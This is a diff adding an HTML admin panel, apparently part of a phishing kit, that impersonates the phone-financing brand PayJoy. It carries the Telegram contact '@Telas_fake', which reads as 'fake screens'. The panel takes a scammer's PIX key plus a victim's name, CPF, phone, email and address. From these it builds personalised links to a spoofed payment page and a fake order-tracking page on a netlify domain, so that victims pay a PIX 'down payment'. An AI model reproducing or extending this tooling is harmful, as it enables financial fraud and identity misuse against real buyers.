@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ADM Payjoy — Gerador de Links</title>
+
+<style>
+body {
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    background: linear-gradient(120deg, #f1f3f6, #e6e9ee);
+}
+
+header {
+    background: #ffffff;
+    padding: 20px;
+    text-align: center;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+}
+
+header h1 {
+    margin: 0;
+    font-size: 20px;
+}
+
+header span {
+    font-size: 13px;
+    color: #666;
+}
+
+.container {
+    max-width: 780px;
+    margin: 30px auto;
+    background: #ffffff;
+    padding: 25px;
+    border-radius: 16px;
+    box-shadow: 0 6px 18px rgba(0,0,0,0.08);
+}
+
+.section {
+    margin-bottom: 25px;
+}
+
+.section h2 {
+    font-size: 16px;
+    margin-bottom: 10px;
+    color: #c2185b;
+    border-bottom: 1px solid #eee;
+    padding-bottom: 5px;
+}
+
+label {
+    display: block;
+    margin-top: 12px;
+    font-size: 14px;
+    font-weight: bold;
+}
+
+input, select, textarea {
+    width: 100%;
+    padding: 12px;
+    margin-top: 6px;
+    border-radius: 8px;
+    border: 1px solid #ccc;
+    font-size: 14px;
+    box-sizing: border-box;
+}
+
+textarea {
+    height: 120px;
+}
+
+button {
+    width: 100%;
+    padding: 14px;
+    margin-top: 15px;
+    background: #c2185b;
+    color: #fff;
+    border: none;
+    border-radius: 10px;
+    font-size: 16px;
+    cursor: pointer;
+}
+
+button.secondary {
+    background: #444;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+    <h1>Painel Administrativo — Payjoy</h1>
+    <span>Telegram: @Telas_fake</span>
+</header>
+
+<div class="container">
+
+    <div class="section">
+        <h2>Configuração</h2>
+        <label>URL base</label>
+        <input id="base" value="https://payjoy-com-br.netlify.app/">
+
+        <label>Título da página</label>
+        <input id="titulo" value="Compra de celular da Payjoy">
+
+        <label>Chave PIX</label>
+        <input id="pix">
+    </div>
+
+    <div class="section">
+        <h2>Produto</h2>
+
+        <label>Modelo do celular</label>
+        <select id="modelo" onchange="preencherProduto()">
+            <option value="">Selecione</option>
+            <option value="samsung">Samsung Galaxy A16</option>
+            <option value="xiaomi">Xiaomi Mi 10T</option>
+            <option value="motorola">Motorola Edge 50 Neo</option>
+            <option value="iphone">Apple iPhone 16</option>
+        </select>
+
+        <label>Nome do produto</label>
+        <input id="produto">
+
+        <label>Valor total (R$)</label>
+        <input id="valor_total">
+
+        <label>Entrada PIX (R$)</label>
+        <input id="entrada">
+
+        <label>Parcelas</label>
+        <select id="parcelas">
+            <option>1x</option>
+            <option>6x</option>
+            <option>12x</option>
+            <option>18x</option>
+            <option>24x</option>
+        </select>
+    </div>
+
+    <div class="section">
+        <h2>Cliente</h2>
+
+        <label>Nome</label>
+        <input id="cliente">
+
+        <label>CPF</label>
+        <input id="cpf">
+
+        <label>Telefone</label>
+        <input id="telefone">
+
+        <label>E-mail</label>
+        <input id="email">
+
+        <label>Endereço completo</label>
+        <input id="endereco">
+
+        <label>Interesse</label>
+        <input id="interesse" value="Compra de celular">
+    </div>
+
+    <div class="section">
+        <h2>Rastreio</h2>
+
+        <label>Código de rastreio</label>
+        <input id="codigo" value="PJ-9F3A2K">
+
+        <label>Status do pedido</label>
+        <select id="status">
+            <option value="1">Pedido sendo preparado</option>
+            <option value="2">Na rota de entrega</option>
+            <option value="3">Pedido entregue</option>
+        </select>
+    </div>
+
+    <button onclick="gerarLinks()">Gerar links</button>
+
+    <div class="section">
+        <h2>Link de Pagamento</h2>
+        <textarea id="linkPagamento" readonly></textarea>
+        <button class="secondary" onclick="copiar('linkPagamento')">Copiar link</button>
+    </div>
+
+    <div class="section">
+        <h2>Link de Rastreio</h2>
+        <textarea id="linkRastreio" readonly></textarea>
+        <button class="secondary" onclick="copiar('linkRastreio')">Copiar link</button>
+    </div>
+
+</div>
+
+<script>
+let imagemProduto = "";
+
+function preencherProduto() {
+    const dados = {
+        samsung: {
+            nome: "Samsung Galaxy A16 128GB 4GB RAM Câmera 50MP Tela 6.7 NFC Preto",
+            total: "899",
+            entrada: "107.88",
+            imagem: "01.webp"
+        },
+        xiaomi: {
+            nome: "Xiaomi Mi 10T 5G Dual Sim 256GB Preto 12GB RAM",
+            total: "2400",
+            entrada: "288.00",
+            imagem: "1.webp"
+        },
+        motorola: {
+            nome: "Motorola Edge 50 Neo 5G 256GB 8GB RAM",
+            total: "1977",
+            entrada: "237.24",
+            imagem: "2.webp"
+        },
+        iphone: {
+            nome: "Apple iPhone 16 (128 GB) - Preto",
+            total: "3476",
+            entrada: "417.12",
+            imagem: "4.webp"
+        }
+    };
+
+    const m = modelo.value;
+    if (dados[m]) {
+        produto.value = dados[m].nome;
+        valor_total.value = dados[m].total;
+        entrada.value = dados[m].entrada;
+        imagemProduto = dados[m].imagem;
+    }
+}
+
+function gerarLinks() {
+    let base = document.getElementById("base").value;
+    if (!base.endsWith("/")) base += "/";
+
+    /* PAGAMENTO */
+    let pagamento = base + "pixpy.html?";
+    pagamento += "titulo=" + encodeURIComponent(titulo.value);
+    pagamento += "&pix=" + encodeURIComponent(pix.value);
+    pagamento += "&produto=" + encodeURIComponent(produto.value);
+    pagamento += "&valor_total=" + encodeURIComponent(valor_total.value);
+    pagamento += "&entrada=" + encodeURIComponent(entrada.value);
+    pagamento += "&parcelas=" + encodeURIComponent(parcelas.value);
+    pagamento += "&cliente=" + encodeURIComponent(cliente.value);
+    pagamento += "&cpf=" + encodeURIComponent(cpf.value);
+    pagamento += "&telefone=" + encodeURIComponent(telefone.value);
+    pagamento += "&email=" + encodeURIComponent(email.value);
+    pagamento += "&endereco=" + encodeURIComponent(endereco.value);
+
+    linkPagamento.value = pagamento;
+
+    /* RASTREIO (CORRIGIDO) */
+    let rastreio = base + "rastreio.html?";
+    rastreio += "codigo=" + encodeURIComponent(codigo.value);
+    rastreio += "&interesse=" + encodeURIComponent(interesse.value);
+    rastreio += "&nome=" + encodeURIComponent(cliente.value);
+    rastreio += "&cpf=" + encodeURIComponent(cpf.value);
+    rastreio += "&telefone=" + encodeURIComponent(telefone.value);
+    rastreio += "&email=" + encodeURIComponent(email.value);
+    rastreio += "&endereco=" + encodeURIComponent(endereco.value);
+    rastreio += "&produto=" + encodeURIComponent(produto.value);
+    rastreio += "&valor_total=" + encodeURIComponent(valor_total.value);
+    rastreio += "&imagem=" + encodeURIComponent(imagemProduto);
+    rastreio += "&status=" + encodeURIComponent(status.value);
+
+    linkRastreio.value = rastreio;
+}
+
+function copiar(id) {
+    const campo = document.getElementById(id);
+    campo.select();
+    document.execCommand("copy");
+    alert("Link copiado com sucesso!");
+}
+</script>
+
+</body>
+</html>
